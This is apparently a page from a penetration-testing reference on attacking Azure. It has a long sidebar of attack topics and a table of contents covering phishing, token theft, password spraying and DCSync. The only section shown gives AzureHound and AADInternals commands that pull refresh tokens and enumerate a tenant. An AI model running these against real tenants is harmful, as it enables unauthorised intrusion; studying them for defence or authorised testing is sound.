        <label class="md-nav__link" for="__nav_39" id="__nav_39_label" tabindex="0">
          Tabnabbing
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_39_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_39">
          <span class="md-nav__icon md-icon"></span>
          Tabnabbing
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Tabnabbing/" class="md-nav__link">
        Tabnabbing
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_40" >
      
      
      
        <label class="md-nav__link" for="__nav_40" id="__nav_40_label" tabindex="0">
          Type Juggling
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_40_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_40">
          <span class="md-nav__icon md-icon"></span>
          Type Juggling
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Type%20Juggling/" class="md-nav__link">
        PHP Juggling type and magic hashes
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41" >
      
      
      
        <label class="md-nav__link" for="__nav_41" id="__nav_41_label" tabindex="0">
          Upload Insecure Files
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_41_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41">
          <span class="md-nav__icon md-icon"></span>
          Upload Insecure Files
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/" class="md-nav__link">
        Upload Insecure Files
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_2" >
      
      
      
        <label class="md-nav__link" for="__nav_41_2" id="__nav_41_2_label" tabindex="0">
          CVE Ffmpeg HLS
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_2_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_2">
          <span class="md-nav__icon md-icon"></span>
          CVE Ffmpeg HLS
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS/" class="md-nav__link">
        FFmpeg HLS vulnerability
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_3" >
      
      
      
        <label class="md-nav__link" for="__nav_41_3" id="__nav_41_3_label" tabindex="0">
          Configuration Apache .htaccess
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_3_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_3">
          <span class="md-nav__icon md-icon"></span>
          Configuration Apache .htaccess
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess/" class="md-nav__link">
        .htaccess upload
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_4" >
      
      
      
        <label class="md-nav__link" for="__nav_41_4" id="__nav_41_4_label" tabindex="0">
          Configuration Busybox httpd.conf
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_4_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_4">
          <span class="md-nav__icon md-icon"></span>
          Configuration Busybox httpd.conf
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Configuration%20Busybox%20httpd.conf/" class="md-nav__link">
        Index
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_5" >
      
      
      
        <label class="md-nav__link" for="__nav_41_5" id="__nav_41_5_label" tabindex="0">
          Configuration uwsgi.ini
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_5_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_5">
          <span class="md-nav__icon md-icon"></span>
          Configuration uwsgi.ini
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Configuration%20uwsgi.ini/" class="md-nav__link">
        uWSGI configuration file
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_6" >
      
      
      
        <label class="md-nav__link" for="__nav_41_6" id="__nav_41_6_label" tabindex="0">
          Extension Flash
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_6_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_6">
          <span class="md-nav__icon md-icon"></span>
          Extension Flash
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Extension%20Flash/" class="md-nav__link">
        Index
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_7" >
      
      
      
        <label class="md-nav__link" for="__nav_41_7" id="__nav_41_7_label" tabindex="0">
          Picture Image Magik
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_7_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_7">
          <span class="md-nav__icon md-icon"></span>
          Picture Image Magik
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Picture%20Image%20Magik/" class="md-nav__link">
        Image Tragik 1 & 2
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_41_8" >
      
      
      
        <label class="md-nav__link" for="__nav_41_8" id="__nav_41_8_label" tabindex="0">
          Zip Slip
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_41_8_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_41_8">
          <span class="md-nav__icon md-icon"></span>
          Zip Slip
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Upload%20Insecure%20Files/Zip%20Slip/" class="md-nav__link">
        Zip Slip
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_42" >
      
      
      
        <label class="md-nav__link" for="__nav_42" id="__nav_42_label" tabindex="0">
          Web Cache Deception
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_42_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_42">
          <span class="md-nav__icon md-icon"></span>
          Web Cache Deception
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Web%20Cache%20Deception/" class="md-nav__link">
        Web Cache Deception
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_43" >
      
      
      
        <label class="md-nav__link" for="__nav_43" id="__nav_43_label" tabindex="0">
          Web Sockets
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_43_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_43">
          <span class="md-nav__icon md-icon"></span>
          Web Sockets
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Web%20Sockets/" class="md-nav__link">
        Web Sockets
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_44" >
      
      
      
        <label class="md-nav__link" for="__nav_44" id="__nav_44_label" tabindex="0">
          XPATH Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_44_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_44">
          <span class="md-nav__icon md-icon"></span>
          XPATH Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XPATH%20Injection/" class="md-nav__link">
        XPATH Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_45" >
      
      
      
        <label class="md-nav__link" for="__nav_45" id="__nav_45_label" tabindex="0">
          XSLT Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_45_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_45">
          <span class="md-nav__icon md-icon"></span>
          XSLT Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XSLT%20Injection/" class="md-nav__link">
        XSLT Injection
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_46" >
      
      
      
        <label class="md-nav__link" for="__nav_46" id="__nav_46_label" tabindex="0">
          XSS Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_46_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_46">
          <span class="md-nav__icon md-icon"></span>
          XSS Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XSS%20Injection/" class="md-nav__link">
        Cross Site Scripting
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XSS%20Injection/XSS%20in%20Angular/" class="md-nav__link">
        XSS in Angular and AngularJS
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XSS%20Injection/XSS%20with%20Relative%20Path%20Overwrite/" class="md-nav__link">
        XSS with Relative Path Overwrite - IE 8/9 and lower
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_47" >
      
      
      
        <label class="md-nav__link" for="__nav_47" id="__nav_47_label" tabindex="0">
          XXE Injection
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_47_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_47">
          <span class="md-nav__icon md-icon"></span>
          XXE Injection
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../XXE%20Injection/" class="md-nav__link">
        XML External Entity
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_48" >
      
      
      
        <label class="md-nav__link" for="__nav_48" id="__nav_48_label" tabindex="0">
           LEARNING AND SOCIALS
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_48_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_48">
          <span class="md-nav__icon md-icon"></span>
           LEARNING AND SOCIALS
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../_LEARNING_AND_SOCIALS/BOOKS/" class="md-nav__link">
        Books
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../_LEARNING_AND_SOCIALS/TWITTER/" class="md-nav__link">
        Twitter
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../_LEARNING_AND_SOCIALS/YOUTUBE/" class="md-nav__link">
        Youtube
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_49" >
      
      
      
        <label class="md-nav__link" for="__nav_49" id="__nav_49_label" tabindex="0">
           template vuln
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_49_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_49">
          <span class="md-nav__icon md-icon"></span>
           template vuln
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../_template_vuln/" class="md-nav__link">
        Vulnerability Title
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  

  
  


<h1 id="cloud-azure">Cloud - Azure</h1>
<h2 id="summary">Summary</h2>
<ul>
<li><a href="#azure-recon-tools">Azure Recon Tools</a></li>
<li><a href="#authenticating-to-the-microsoft-graph-api-in-powershell">Authenticating to the Microsoft Graph API in PowerShell</a><ul>
<li><a href="#graph-api-refresh-token">Graph API Refresh Token</a></li>
<li><a href="#graph-api-access-token">Graph API Access Token</a></li>
</ul>
</li>
<li><a href="#terminology">Terminology</a></li>
<li><a href="#training">Training</a></li>
<li><a href="#enumeration">Enumeration</a><ul>
<li><a href="#enumerate-valid-emails">Enumerate valid emails</a></li>
<li><a href="#enumerate-azure-subdomains">Enumerate Azure Subdomains</a></li>
<li><a href="#enumerate-tenant-with-azure-ad-powershell">Enumerate tenant with Azure AD Powershell</a></li>
<li><a href="#enumerate-tenant-with-az-powershell">Enumerate tenant with Az Powershell</a></li>
<li><a href="#enumerate-tenant-with-az-cli">Enumerate tenant with az cli</a></li>
<li><a href="#enumerate-manually">Enumerate manually</a></li>
<li><a href="#enumeration-methodology">Enumeration methodology</a></li>
</ul>
</li>
<li><a href="#phishing-with-evilginx2">Phishing with Evilginx2</a></li>
<li><a href="#illicit-consent-grant">Illicit Consent Grant</a><ul>
<li><a href="#register-application">Register Application</a></li>
<li><a href="#configure-application">Configure Application</a></li>
<li><a href="#setup-365-stealer-deprecated">Setup 365-Stealer (Deprecated)</a></li>
<li><a href="#setup-vajra">Setup Vajra</a></li>
</ul>
</li>
<li><a href="#device-code-phish">Device Code Phish</a></li>
<li><a href="#token-from-managed-identity">Token from Managed Identity</a><ul>
<li><a href="#azure-api-via-powershell">Azure API via Powershell</a></li>
<li><a href="#azure-api-via-python-version">Azure API via Python Version</a></li>
<li><a href="#get-tokens">Get Tokens</a></li>
<li><a href="#use-tokens">Use Tokens</a></li>
<li><a href="#refresh-token">Refresh Tokens</a></li>
</ul>
</li>
<li><a href="#stealing-tokens">Stealing Tokens</a><ul>
<li><a href="#stealing-tokens-from-az-cli">Stealing tokens from az cli</a></li>
<li><a href="#stealing-tokens-from-az-powershell">Stealing tokens from az powershell</a></li>
</ul>
</li>
<li><a href="#add-credentials-to-all-enterprise-applications">Add Credentials to All Enterprise Applications</a></li>
<li><a href="#spawn-ssh-for-azure-web-app">Spawn SSH for Azure Web App</a></li>
<li><a href="#azure-storage-blob">Azure Storage Blob</a><ul>
<li><a href="#enumerate-blobs">Enumerate blobs</a></li>
<li><a href="#sas-url">SAS URL</a></li>
<li><a href="#list-and-download-blobs">List and download blobs</a></li>
</ul>
</li>
<li><a href="#runbook-automation">Runbook Automation</a><ul>
<li><a href="#create-a-runbook">Create a Runbook</a></li>
<li><a href="#persistence-via-automation-accounts">Persistence via Automation accounts</a></li>
</ul>
</li>
<li><a href="#virtual-machine-runcommand">Virtual Machine RunCommand</a></li>
<li><a href="#keyvault-secrets">KeyVault Secrets</a></li>
<li><a href="#pass--the-certificate">Pass The Certificate</a></li>
<li><a href="#pass-the-prt">Pass The PRT</a></li>
<li><a href="#intunes-administration">Intunes Administration</a></li>
<li><a href="#dynamic-group-membership">Dynamic Group Membership</a></li>
<li><a href="#administrative-unit">Administrative Unit</a></li>
<li><a href="#deployment-template">Deployment Template</a></li>
<li><a href="#application-proxy">Application Proxy</a></li>
<li><a href="#conditional-access">Conditional Access</a></li>
<li><a href="#azure-ad">Azure AD</a><ul>
<li><a href="#azure-ad-vs-active-directory">Azure AD vs Active Directory</a></li>
<li><a href="#password-spray">Password Spray</a></li>
<li><a href="#convert-guid-to-sid">Convert GUID to SID</a></li>
</ul>
</li>
<li><a href="#azure-ad-connect">Azure AD Connect </a><ul>
<li><a href="#azure-ad-connect---password-extraction">Azure AD Connect - Password extraction</a></li>
<li><a href="#azure-ad-connect---msol-accounts-password-and-dcsync">Azure AD Connect - MSOL Account's password and DCSync</a></li>
<li><a href="#azure-ad-connect---seamless-single-sign-on-silver-ticket">Azure AD Connect - Seamless Single Sign On Silver Ticket</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
<h2 id="azure-recon-tools">Azure Recon Tools</h2>
<ul>
<li><a href="https://github.com/BloodHoundAD/AzureHound"><strong>BloodHoundAD/AzureHound</strong></a> - Azure Data Exporter for BloodHound
    <div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c"># First, retrieve a refresh token (-r) if username/password isn&#39;t supported.</span>
<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="c"># An access token (-j) isn&#39;t recommended because it can expire before the end of azurehound execution</span>
<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="nb">Install-Module</span> <span class="n">AADInternals</span> <span class="n">-Scope</span> <span class="n">CurrentUser</span>
<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="nb">Import-Module</span> <span class="n">AADInternals</span>
<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="nv">$rt</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-AADIntAccessToken</span> <span class="n">-ClientId</span> <span class="s2">&quot;1950a258-227b-4e31-a9cf-717495945fc2&quot;</span> <span class="n">-Resource</span> <span class="s2">&quot;https://graph.microsoft.com&quot;</span> <span class="n">-PRTToken</span> <span class="p">(</span><span class="nb">Get-AADIntUserPRTToken</span><span class="p">)</span> <span class="n">-IncludeRefreshToken</span> <span class="nv">$true</span><span class="p">)[</span><span class="n">1</span><span class="p">]</span>
<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="c"># Second, launch azurehound collector</span>
<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="p">./</span><span class="n">azurehound</span> <span class="n">-r</span> <span class="s2">&quot;0.AXMAMe...&quot;</span> <span class="n">list</span> <span class="p">-</span><span class="n">-tenant</span> <span class="s2">&quot;753a0bc5-...&quot;</span> <span class="n">-o</span> <span class="n">output</span><span class="p">.</span><span class="n">json</span>
<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>
<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a><span class="c">## Connects on your Azure account using the refresh token provided and the tenant of the account</span>
<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="c">## and collects every possible objects in contoso.microsoft.com. Results are stored in json</span>
<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a><span class="p">./</span><span class="n">azurehound</span> <span class="n">-r</span> <span class="nv">$rt</span> <span class="p">-</span><span class="n">-tenant</span> <span class="s2">&quot;contoso.onmicrosoft.com&quot;</span> <span class="n">list</span> <span class="n">-o</span> <span class="n">azurehound-scan</span><span class="p">.</span><span class="n">json</span> <span class="p">-</span><span class="n">-tenant</span> <span class="s2">&quot;contoso.microsoft.com&quot;</span>
<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="c">## Sets configuration file with connection variables and other things (not required)</span>
<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a><span class="p">./</span><span class="n">azurehound</span> <span class="n">configure</span>
<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="c">## Collects every objects on all accessible tenants using username/password and prints it to stdout</span>
<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a><span class="p">./</span><span class="n">azurehound</span> <span class="n">-u</span> <span class="s2">&quot;MattNelson@contoso.onmicrosoft.com&quot;</span> <span class="n">-p</span> <span class="s2">&quot;MyVerySecurePassword123&quot;</span> <span class="p">-</span><span class="n">-tenant</span> <span class="s2">&quot;contoso.onmicrosoft.com&quot;</span> <span class="n">list</span>
<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="c">## Collects every objects on a specific tenant using username/password and stores it in json</span>
<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a><span class="p">./</span><span class="n">azurehound</span> <span class="n">-u</span> <span class="s2">&quot;phisheduser@contoso.onmicrosoft.com&quot;</span> <span class="n">-p</span> <span class="s2">&quot;Password1&quot;</span> <span class="n">list</span> <span class="n">-o</span> <span class="n">initial-scan</span><span class="p">.</span><span class="n">json</span> <span class="p">-</span><span class="n">-tenant</span> <span class="s2">&quot;contoso.onmicrosoft.com&quot;</span>
<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="c">## Collects every objects on all tenants accessible using Service Principal secret</span>
<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="p">./</span><span class="n">azurehound</span> <span class="n">-a</span> <span class="s2">&quot;6b5adee8-...&quot;</span> <span class="n">-s</span> <span class="s2">&quot;&lt;secret&gt;&quot;</span> <span class="p">-</span><span class="n">-tenant</span> <span class="s2">&quot;contoso.onmicrosoft.com&quot;</span> <span class="n">list</span>
<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="c">## Collects AzureAD info (all except AzureRM info) using JWT access token</span>
<a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a><span class="p">./</span><span class="n">azurehound</span> <span class="n">-j</span> <span class="s2">&quot;ey...&quot;</span> <span class="p">-</span><span class="n">-tenant</span> <span class="s2">&quot;contoso.onmicrosoft.com&quot;</span> <span class="n">list</span> <span class="n">az-ad</span>
<a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a><span class="c">## Collects every users using refresh token</span>
<a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a><span class="p">./</span><span class="n">azurehound</span> <span class="n">-r</span> <span class="s2">&quot;0.ARwA6Wg...&quot;</span> <span class="p">-</span><span class="n">-tenant</span> <span class="s2">&quot;contoso.onmicrosoft.com&quot;</span> <span class="n">list</span> <span class="n">users</span>
<a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>
<a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a><span class="c"># List of collections</span>
<a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a><span class="n">az-ad</span><span class="p">:</span> <span class="n">Collect</span> <span class="n">all</span> <span class="n">information</span> <span class="n">available</span> <span class="n">at</span> <span class="n">the</span> <span class="n">AzureAD</span> <span class="n">tenant</span> <span class="n">level</span><span class="p">.</span> <span class="k">In</span> <span class="n">most</span> <span class="n">tenants</span><span class="p">,</span> <span class="n">all</span> <span class="n">users</span> <span class="n">have</span> <span class="n">the</span> <span class="n">ability</span> <span class="n">to</span> <span class="n">read</span> <span class="n">all</span> <span class="n">this</span> <span class="n">information</span> <span class="n">by</span> <span class="k">default</span><span class="p">.</span>
<a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a><span class="n">az-rm</span><span class="p">:</span> <span class="n">Collect</span> <span class="n">all</span> <span class="n">information</span> <span class="n">available</span> <span class="n">at</span> <span class="n">the</span> <span class="n">AzureRM</span> <span class="n">subscription</span> <span class="n">level</span><span class="p">.</span> <span class="n">Users</span> <span class="k">do</span> <span class="n">not</span> <span class="n">by</span> <span class="k">default</span> <span class="n">have</span> <span class="n">read</span> <span class="n">access</span> <span class="n">to</span> <span class="n">any</span> <span class="n">of</span> <span class="n">this</span> <span class="n">information</span><span class="p">.</span>
<a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>
<a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a><span class="n">apps</span><span class="p">:</span> <span class="n">Collects</span> <span class="n">AzureAD</span> <span class="n">application</span> <span class="n">registration</span> <span class="n">objects</span><span class="p">.</span>
<a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a><span class="n">devices</span><span class="p">:</span> <span class="n">Collects</span> <span class="n">AzureAD</span> <span class="n">devices</span> <span class="n">regardless</span> <span class="n">of</span> <span class="n">join</span> <span class="n">type</span><span class="p">.</span>
<a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a><span class="n">groups</span><span class="p">:</span> <span class="n">Collects</span> <span class="n">AzureAD</span> <span class="n">security-enabled</span> <span class="n">groups</span><span class="p">,</span> <span class="n">both</span> <span class="n">role</span> <span class="n">eligible</span> <span class="n">and</span> <span class="n">non</span> <span class="n">role</span> <span class="n">eligible</span><span class="p">.</span>
<a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a><span class="n">key-vaults</span><span class="p">:</span> <span class="n">Collects</span> <span class="n">AzureRM</span> <span class="n">key</span> <span class="n">vaults</span><span class="p">.</span>
<a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a><span class="n">management-groups</span><span class="p">:</span> <span class="n">Collects</span> <span class="n">AzureRM</span> <span class="n">management</span> <span class="nb">group </span><span class="n">objects</span>
<a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a><span class="n">resource-groups</span><span class="p">:</span> <span class="n">Collects</span> <span class="n">AzureRM</span> <span class="n">resource</span> <span class="nb">group </span><span class="n">objects</span>
<a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a><span class="n">roles</span><span class="p">:</span> <span class="n">Collects</span> <span class="n">AzureAD</span> <span class="n">admin</span> <span class="n">role</span> <span class="n">objects</span>
<a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a><span class="n">service-principals</span><span class="p">:</span> <span class="n">Collects</span> <span class="n">AzureAD</span> <span class="n">service</span> <span class="n">principals</span>
<a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a><span class="n">subscriptions</span><span class="p">:</span> <span class="n">Collevts</span> <span class="n">AzureRM</span> <span class="n">subscriptions</span>
<a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a><span class="n">tenants</span><span class="p">:</span> <span class="n">Collevts</span> <span class="n">AzureAD</span> <span class="n">tenant</span> <span class="n">objects</span>
<a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a><span class="n">users</span><span class="p">:</span> <span class="n">Collects</span> <span class="n">AzureAD</span> <span class="n">users</span><span class="p">,</span> <span class="n">including</span> <span class="n">any</span> <span class="n">guest</span> <span class="n">users</span> <span class="k">in</span> <span class="n">the</span> <span class="n">target</span> <span class="n">tenant</span><span class="p">.</span>
